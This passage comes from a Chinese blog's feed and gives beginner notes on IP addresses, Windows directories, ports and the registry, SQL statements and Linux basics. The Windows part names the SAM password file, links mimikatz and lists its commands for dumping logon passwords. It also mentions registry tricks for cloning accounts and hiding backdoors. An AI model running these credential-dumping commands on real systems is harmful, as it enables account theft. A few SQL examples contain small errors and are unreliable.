title="Ip地址"></a>Ip地址</h2><ul><li>ip地址在网络层唯一标识一台网络设备</li><li>ip地址包含两部分</li></ul><ul><li>网络位</li><li>主机位<h2 id="Ip地址分类"><a href="#Ip地址分类" class="headerlink" title="Ip地址分类"></a>Ip地址分类</h2><img src="/img/874126-20180117224704553-1506200749.png"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows基础</title>
      <link href="/archives/7d0e78ef.html"/>
      <url>/archives/7d0e78ef.html</url>
      
        <content type="html"><![CDATA[<h1 id="windows版本"><a href="#windows版本" class="headerlink" title="windows版本"></a>windows版本</h1><p>个人&#x2F;普通用户: winxp、win7、win8、win10 win10 等<br>企业&#x2F;公司: winserver03、winserver08、winserver12 winserver16 等</p><h1 id="windows常见目录"><a href="#windows常见目录" class="headerlink" title="windows常见目录"></a>windows常见目录</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts    域名解析ip地址  </span><br></pre></td></tr></table></figure><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</br><br>需要注意的是，Hosts文件配置的映射是静态的，如果网络上的计算机更改了请及时更新IP地址，否则将不能访问,也就是说Hosts的请求级别比DNS高。<br>刷新dns命令：ipconfig&#x2F;flushdns</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files                         一般是安装64位程序的文件存放的位置</span><br><span class="line">C:\Program Files (x86)                   32位应用程序的默认安装文件夹</span><br><span class="line">C:\ProgramData                           系统文件夹，都是用来存放一些setting文件、缓存文件的（是一个隐藏文件夹，win7打开路     径：组织-文件夹和搜索选项-查看-显示隐藏的文件、文件夹和驱动器）</span><br><span class="line">C:\Windows                               系统配置文件安装目录</span><br><span class="line">C:\Windows\System32\config\SAM           存储账号和密码，运行状态下是无法打开的。</span><br><span class="line">perfLogs是windows7的日志信息，如磁盘扫描 错误信息，删掉可以，但不建议删，删掉反而会降低系统速度，PerfLogs是系统自动生成的。</span><br></pre></td></tr></table></figure><h3 id="mimikatz读取用户密码"><a href="#mimikatz读取用户密码" class="headerlink" title="mimikatz读取用户密码"></a>mimikatz读取用户密码</h3><p>mimikatz下载地址:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gentilkiwi/mimikatz</span><br></pre></td></tr></table></figure><p>使用管理员权限（system）运行脚本：</p><ul><li><p>privilege::debug     提升权限     </p></li><li><p>sekurlsa::logonPasswords       就是抓取密码</p><h1 id="计算机服务"><a href="#计算机服务" class="headerlink" title="计算机服务"></a>计算机服务</h1><h2 id="常见的服务"><a href="#常见的服务" class="headerlink" title="常见的服务"></a>常见的服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web服务、dns服务、dhcp服务、邮件服务、telnet服务、ssh服务、ftp服务、smb服务</span><br></pre></td></tr></table></figure><p>telnet和ssh的区别： ssh是一种加密的，需要交换密钥，但是telnet是明文传输的，不安全。</p><h2 id="计算机端口"><a href="#计算机端口" class="headerlink" title="计算机端口"></a>计算机端口</h2></li><li><p>端口的作用是用来区分服务</p></li><li><p>端口不可以重复使用</p></li><li><p>端口范围是从1-65535</p></li><li><p>知名端口（well-known ports）  0-1023 分给了系统自带的一些服务</p></li><li><p>动态端口（dynamic ports） 动态端口的范围从1024到65535</p></li></ul><p>netstat命令的功能是显示网络连接、路由表和网络接口信息，可以让用户得知目前都有哪些网络连接正在运作。  </p><p>根据端口，我们可以探测计算机开放的服务、操作系统、网络角色。</p><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP协议代理服务器常用端口号：80/8080/3128/8081/9080</span><br><span class="line">FTP（文件传输）协议代理服务器常用端口号：21</span><br><span class="line">Telnet（远程登录）协议代理服务器常用端口：23</span><br><span class="line">TFTP（Trivial File Transfer Protocol ），默认的端口号为69/udp；</span><br><span class="line">SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22/tcp；</span><br><span class="line">SMTP Simple Mail Transfer Protocol (E-mail)，默认的端口号为25/tcp（木马Antigen、Email</span><br><span class="line">Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口）；</span><br><span class="line">POP3 Post Office Protocol (E-mail) ，默认的端口号为110/tcp；</span><br><span class="line">TOMCAT，默认的端口号为8080；</span><br><span class="line">WIN2003远程登陆，默认的端口号为3389；</span><br><span class="line">Oracle 数据库，默认的端口号为1521；</span><br><span class="line">MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp；</span><br><span class="line">QQ，默认的端口号为1080/udp</span><br></pre></td></tr></table></figure><h1 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h1><p>注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。  </p><h2 id="注册表结构"><a href="#注册表结构" class="headerlink" title="注册表结构"></a>注册表结构</h2><p>win+r–cmd–regedit  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT</span><br><span class="line"> 管理文件系统。根据在Windows 中安装的应用程序的扩展名,该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。</span><br><span class="line">HKEY_CURRENT_USER</span><br><span class="line"> 管理系统当前的用户信息。在这个根键中保存了本地计算机中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码。在用     户登录Windows 98时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。</span><br><span class="line">HKEY_LOCAL_MACHINE</span><br><span class="line"> 管理当前系统硬件配置。在根键这个中保存了本地计算机硬件配置数据,此根键下的子关键字包括在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中。</span><br><span class="line">这个根键里面的许多子键与System.ini文件中设置项类似。</span><br><span class="line">HKEY_USERS</span><br><span class="line"> 管理系统的用户信息。在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。</span><br><span class="line">HKEY_CURRENT_CONFIG</span><br><span class="line"> 管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据,该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的Windows 98中文版的安装的信息。</span><br></pre></td></tr></table></figure><h2 id="注册表的使用"><a href="#注册表的使用" class="headerlink" title="注册表的使用"></a>注册表的使用</h2><ul><li>查询开机启动程序</li><li>克隆账号密码权限</li><li>读取服务密码</li><li>隐藏后门<h1 id="POWERSHELL"><a href="#POWERSHELL" class="headerlink" title="POWERSHELL"></a>POWERSHELL</h1>Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境<h2 id="POWERSHELL常用命令"><a href="#POWERSHELL常用命令" class="headerlink" title="POWERSHELL常用命令"></a>POWERSHELL常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-command  获取命令</span><br><span class="line">Get-help  get-service  获取命令使用说明</span><br><span class="line">获取PowerShell版本信息</span><br><span class="line">Get-Host或$PSVersionTable</span><br><span class="line">获取当前PowerShell环境包含的Module</span><br><span class="line">Get-Module</span><br><span class="line">Get-server   获取计算机服务</span><br></pre></td></tr></table></figure><h1 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h1>上一篇文章<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://putdown.top/2022/05/12/Windows%E5%91%BD%E4%BB%A4/</span><br></pre></td></tr></table></figure><h1 id="BAT文件"><a href="#BAT文件" class="headerlink" title="BAT文件"></a>BAT文件</h1>bat文件是dos下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为 .bat 或 .cmd。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用cmd.exe按照该文件中各个命令出现的顺序来逐个运行它们。使用批处理文件（也被称为批处理程序或脚本），可以简化日常或重复性任务。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库语句</title>
      <link href="/archives/78f500d6.html"/>
      <url>/archives/78f500d6.html</url>
      
        <content type="html"><![CDATA[<h1 id="数据库的基本语句"><a href="#数据库的基本语句" class="headerlink" title="数据库的基本语句"></a>数据库的基本语句</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create database 数据库名                 创建新数据库</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database 数据库名                   删除数据库</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 库名                                 使用数据库</span><br></pre></td></tr></table></figure><h1 id="数据表的使用"><a href="#数据表的使用" class="headerlink" title="数据表的使用"></a>数据表的使用</h1><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Create table book(</span><br><span class="line"></span><br><span class="line">id int not null auto_increment(设置主键自增),</span><br><span class="line"></span><br><span class="line">字段名 varchar(50) not null(不为空) default &quot; &quot; (默认值为&quot;&quot;),</span><br><span class="line"></span><br><span class="line">字段名 varchar(50) not null default ‘’,</span><br><span class="line"></span><br><span class="line">字段名 varchar(50) not null default ‘’,</span><br><span class="line"></span><br><span class="line">字段名double not null default 0.00,</span><br><span class="line"></span><br><span class="line">字段名 text,</span><br><span class="line"></span><br><span class="line">字段名date,</span><br><span class="line"></span><br><span class="line">primary key (id),</span><br><span class="line"></span><br><span class="line">index 索引名称(数据表想设置索引列的名称),(为某个字段创建索引)</span><br><span class="line"></span><br><span class="line">)    新增数据表</span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>char:定长字符型（固定长度，固定空间数）</li><li>varcar：变长字符型（不固定长度，最大空间数）</li><li>text：文本类型</li><li>int:整数类型</li><li>decimal：精确数值型（浮点类型）</li><li>datetime：时间类型</li><li>tinyint：微整型标志位（只有0和1类似于bool）<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename table 原表名 TO  新表名     重命名数据表</span><br></pre></td></tr></table></figure>或者<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table  原表名  rename 新表名   重命名数据</span><br></pre></td></tr></table></figure><h2 id="查看所有数据"><a href="#查看所有数据" class="headerlink" title="查看所有数据"></a>查看所有数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables；</span><br></pre></td></tr></table></figure><h2 id="删除某张表"><a href="#删除某张表" class="headerlink" title="删除某张表"></a>删除某张表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table 表名;</span><br></pre></td></tr></table></figure><h2 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc 表名；</span><br></pre></td></tr></table></figure><h2 id="添加列放在某列的后面"><a href="#添加列放在某列的后面" class="headerlink" title="添加列放在某列的后面"></a>添加列放在某列的后面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter table 数据表名 add 列名 数据类型 约束 alter 列名;   </span><br><span class="line">例如:alter table &#x27;table_name&#x27; add height int(4) default 170 alter name;   添加一列int类型的 身高字段，默认值为170，放在name字段后面（如果想放在第一列把alter 列名改为first）</span><br></pre></td></tr></table></figure><h2 id="更改某列列名"><a href="#更改某列列名" class="headerlink" title="更改某列列名"></a>更改某列列名</h2>alter table 表名 change 原列名 新列名 数据类型 约束；<h1 id="数据库关键字"><a href="#数据库关键字" class="headerlink" title="数据库关键字"></a>数据库关键字</h1><h2 id="where"><a href="#where" class="headerlink" title="where"></a>where</h2>where常在数据库中用来进行条件筛选<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xx from xx where id=xx;</span><br></pre></td></tr></table></figure>这就是筛选出id字段&#x3D;xx的所有记录</li></ul><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>用于查询数据表里的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 查询的字段名(*代表全部数据) from 表名 where [条件表达式]</span><br></pre></td></tr></table></figure><h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><p>用于新增数据库里新的字段和数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 (字段名1，字段名2，字段名3) values(&quot;字段名1的值&quot;,&quot;字段名2的值&quot;,&quot;字段名3的值&quot;)</span><br></pre></td></tr></table></figure><p>可以利用insert关键字将已有的表中数据复制到另一张新表中. 举例：将student表中name,qq_mail两字段数据复制到test_user的name和email字段中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into test_user(name,email) select name,qq_mail from student;</span><br></pre></td></tr></table></figure><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>用来修改数据库里的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 值1=xx，值2=xx where [条件表达式]</span><br></pre></td></tr></table></figure><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><p>用来删除数据库中的某个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名 where [条件表达式]</span><br></pre></td></tr></table></figure><h2 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h2><p>用来去除数据库中重复的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct 字段名(*) from 表名</span><br></pre></td></tr></table></figure><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>用于查询的时候可以对数据进行升序&#x2F;降序排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 order by desc(降序)/asc(升序) 默认升序</span><br></pre></td></tr></table></figure><h2 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h2><p>用于数据库查询的时候对数据进行分组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 group by 字段名1  按照字段名1进行分组</span><br></pre></td></tr></table></figure><h2 id="having"><a href="#having" class="headerlink" title="having"></a>having</h2><p>和where一样是进行条件筛选的，但是区别是where是先把所有符合条件的数据进行筛选，筛选之后再进行分组操作，而having是先进行分组操作，分组之后再对分组后的数据进行筛选</p><p>关于数据库中having和where的区别<br>1.首先用having条件来查询的语句是先分组再判断的<br>2.having可以使用统计函数，where不可以<br>3.having可以指定查询的字段别名，where不可以<br>4.关于关键字执行顺序 where -&gt; group by -&gt; having -&gt; order by -&gt; limit</p><h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>limit是常用于分类查询的一个关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 limit 1 , 5;这是从第二条数据开始查，查询五条数据</span><br></pre></td></tr></table></figure><p>第一个参数是从第几行开始查，第二个关键字是查询几条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 limit  5;   这是默认从第一行开始查，查询5条数据，当默认第一行开始的时候是limit 0 , 5 所以可以省略第一个参数</span><br></pre></td></tr></table></figure><h2 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h2><p>这个关键字常用于limit中 表示跳过几条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 limit 1 , 5 offset 3;这是从第二条数据开始查，查询五条数据</span><br></pre></td></tr></table></figure><p>跳过3条数据，也就是说查询第5，6条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与select 字段名 from 表名 limit 5,2; (从第五条数据开始查询，查询两条数据)查询结果是一样的</span><br></pre></td></tr></table></figure><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p>常用于条件筛选中，表示同时满足and前后的条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 where 字段名1&gt;xx and 字段名2=yy;</span><br></pre></td></tr></table></figure><p>筛选出既满足字段名1&gt;xx的记录和字段名2&#x3D;yy的记录取两者的交集</p><h2 id="or"><a href="#or" class="headerlink" title="or"></a>or</h2><p>常用于条件筛选中，表示or前后的条件满足其一即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 字段名1&gt;xx or字段名2=yy;</span><br></pre></td></tr></table></figure><p>筛选出满足字段名1&gt;xx的记录或者是字段名2&#x3D;yy的记录</p><h2 id="like"><a href="#like" class="headerlink" title="like"></a>like</h2><p>常用于数据库中模糊查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 where name=&quot;刘%&quot;;</span><br></pre></td></tr></table></figure><p>查询name中刘是第一个字的所有数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名 where name=&quot;刘_&quot;</span><br></pre></td></tr></table></figure><p>查询name中刘是第一个字，一共2个字的所有数据;</p><p>_代表匹配一个任意字符，%表示匹配多个任意字符</p><h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p>常用于数据库中的组合查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段名 FROM 表名1</span><br><span class="line">UNION</span><br><span class="line">SELECT 字段名 FROM 表名2;</span><br></pre></td></tr></table></figure><p>如果表1有a,b,c,d四条数据，表二有a,e,f,g四条数据，那么查询结果就是a,b,c,d,e,f,g，是会去掉相同的数据的</p><h2 id="union-all"><a href="#union-all" class="headerlink" title="union all"></a>union all</h2><p>常用于数据库中的组合查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段名 FROM 表名1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT 字段名 FROM 表名2;</span><br></pre></td></tr></table></figure><p>如果表1有a,b,c,d四条数据，表二有a,e,f,g四条数据，那么查询结果就是a,b,c,d,a,e,f,g，是不会去掉相同的数据的</p><h2 id="left-join"><a href="#left-join" class="headerlink" title="left join"></a>left join</h2><p>左连接查询，常用于多表联查，将两个表联合查询，查询出来的结果会包括左表的全部记录和右表表中符合左表字段的记录，如果左表中对应的数据在右表查不到的话在右表中对应字段的值会显示为NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名1 left join 表名2 on 表名1.字段名=表名2.字段名;</span><br></pre></td></tr></table></figure><h2 id="right-join"><a href="#right-join" class="headerlink" title="right join"></a>right join</h2><p>右连接查询，常用于多表联查，将两个表联合查询，查询出来的结果会包括右表的全部记录和左表中符合右表字段的记录，如果右表中对应的数据在左表查不到的话在左表中对应字段的值会显示为NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段名 from 表名1 right join 表名2 on 表名1.字段名=表名2.字段名;</span><br></pre></td></tr></table></figure><h2 id="inner-join"><a href="#inner-join" class="headerlink" title="inner join"></a>inner join</h2><p>内连接查询，常用于多表联查，会把两个表中共有的字段名及数据显示出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名1 inner join 表名2 on 表名1.字段名=表名2.字段名;</span><br></pre></td></tr></table></figure><h2 id="Alter"><a href="#Alter" class="headerlink" title="Alter"></a>Alter</h2><p>修改字段长度常用语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 字段名 字段类型;</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table qtline modify qtl_bidernote VARCHAR2(4000);</span><br></pre></td></tr></table></figure><h2 id="rename"><a href="#rename" class="headerlink" title="rename"></a>rename</h2><p>用于修改字段名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE  表名 RENAME COLUMN 原字段名 TO 改后字段名;</span><br></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>添加字段常用sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add  字段名  字段类型(字段长度)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础操作</title>
      <link href="/archives/38e76711.html"/>
      <url>/archives/38e76711.html</url>
      
        <content type="html"><![CDATA[<p>Linux 一些基础知识</p><h1 id="Linux常见发行版本"><a href="#Linux常见发行版本" class="headerlink" title="Linux常见发行版本"></a>Linux常见发行版本</h1><ul><li>RedHat Linux</li><li>SuSE Linux</li><li>Ubuntu Linux</li><li>Mandrake Linux</li><li>Caldera Linux</li><li>Turbolinux</li><li>Debian GNU&#x2F;Linux</li><li>Gentoo Linux</li><li>Linpus Linux<h2 id="Linux的优点"><a href="#Linux的优点" class="headerlink" title="Linux的优点"></a>Linux的优点</h2>开源　免费　稳定　安全　高性能<h1 id="Linux内核版本"><a href="#Linux内核版本" class="headerlink" title="Linux内核版本"></a>Linux内核版本</h1>Linux 的版本号分为两部分，即内核版本与发行版本。内核版本号由3个数字组成：A.B.C<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A：内核主版本号。这是很少发生变化，只有当发生重大变化的代码和内核发生才会发生。</span><br><span class="line">B：内核次版本号。是指一些重大修改的内核。偶数表示稳定版本；奇数表示开发中版本。</span><br><span class="line">C：内核修订版本号。是指轻微修订的内核。这个数字当有安全补丁,bug修复，新的功能或驱动程序，内核便会有变化。</span><br></pre></td></tr></table></figure><h1 id="磁盘分区表示"><a href="#磁盘分区表示" class="headerlink" title="磁盘分区表示"></a>磁盘分区表示</h1>Linux中将硬盘、分区等设备均表示为文件</li></ul><p>以 &#x2F;dev&#x2F;hda5 为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dev:硬件设备文件所在的目录</span><br><span class="line">hd: hd 表示IDE设备;sd 表示SCSI设备</span><br><span class="line">a: 硬盘的顺序号，以字母a、b、c……表示</span><br><span class="line">5: 分区的顺序号，以数字1、2、3……表示</span><br></pre></td></tr></table></figure><h1 id="文件系统类型"><a href="#文件系统类型" class="headerlink" title="文件系统类型"></a>文件系统类型</h1><h2 id="Linux中默认使用的文件系统类型"><a href="#Linux中默认使用的文件系统类型" class="headerlink" title="Linux中默认使用的文件系统类型"></a>Linux中默认使用的文件系统类型</h2><ul><li>EXT4， 第3代扩展（Extended）文件系统</li><li>SWAP，交换文件系统<h2 id="Linux支持的其它文件系统类型"><a href="#Linux支持的其它文件系统类型" class="headerlink" title="Linux支持的其它文件系统类型"></a>Linux支持的其它文件系统类型</h2></li><li>FAT16、FAT32、NTFS</li><li>XFS、JFS</li></ul><h1 id="Linux-系统启动过程"><a href="#Linux-系统启动过程" class="headerlink" title="Linux 系统启动过程"></a>Linux 系统启动过程</h1><ul><li>内核的引导。</li><li>运行 init。</li><li>系统初始化。</li><li>建立终端 。</li><li>用户登录系统。<h1 id="Linux系统目录结构"><a href="#Linux系统目录结构" class="headerlink" title="Linux系统目录结构"></a>Linux系统目录结构</h1><img src="/img/src=http___gitee.com_Makeryangyu_Static_raw_master_image-20200515163315845.png&refer=http___gitee.webp"></li></ul><p>&#x2F;bin : 系统命令<br>(&#x2F;usr&#x2F;bin、&#x2F;usr&#x2F;local&#x2F;bin)：是Binary的缩写，这个⽬录存放最经常使⽤的命令。</p><p>&#x2F;sbin: 存放系统管理员命令<br>（&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;localsbin）：s就是Super User的意思，这⾥存放的是系统管理员的系统管理程序。</p><p>&#x2F;home: 普通用户的家目录<br>存放普通⽤户的主⽬录，在Linux中每个⽤户都有⼀个⾃⼰的⽬录，⼀般该⽬录是以⽤户的账号命令的。</p><p>&#x2F;root: 管理员家目录<br>该⽬录为系统管理员，也称作超级管理员的主⽬录。</p><p>&#x2F;boot: linux系统启动文件<br>存放的是启动Linux时使⽤的⼀些核⼼⽂件，包括⼀些链接⽂件以及镜像⽂件。</p><p>&#x2F;proc: 关联系统虚拟设备<br>这个⽬录是⼀个虚拟⽬录，它是系统内存的映射，访问这个⽬录来获取系统信息。</p><p>&#x2F;srv : 该⽬录存放⼀些服务启动之后需要提取的数据。<br>service缩写，该⽬录存放⼀些服务启动之后需要提取的数据。</p><p>&#x2F;tmp : Linux系统的垃圾桶<br>这个⽬录⽤来存放⼀些临时⽂件。</p><p>&#x2F;dev：类似于windows的设备管理器，把所有的硬件⽤⽂件的形式存储。</p><p>&#x2F;media: 多媒体目录<br>linux系统会⾃动识别⼀些设备，⾃动识别⼀些设备，例如：U盘、光驱等。</p><p>&#x2F;mnt : 挂载一些硬件设备的目录<br>系统提供该⽬录是为了让⽤户临时挂载别的⽂件系统</p><p>&#x2F;opt : 下载文件常用目录<br>这是给主机额外安装软件所摆放的⽬录。</p><p>&#x2F;usr : 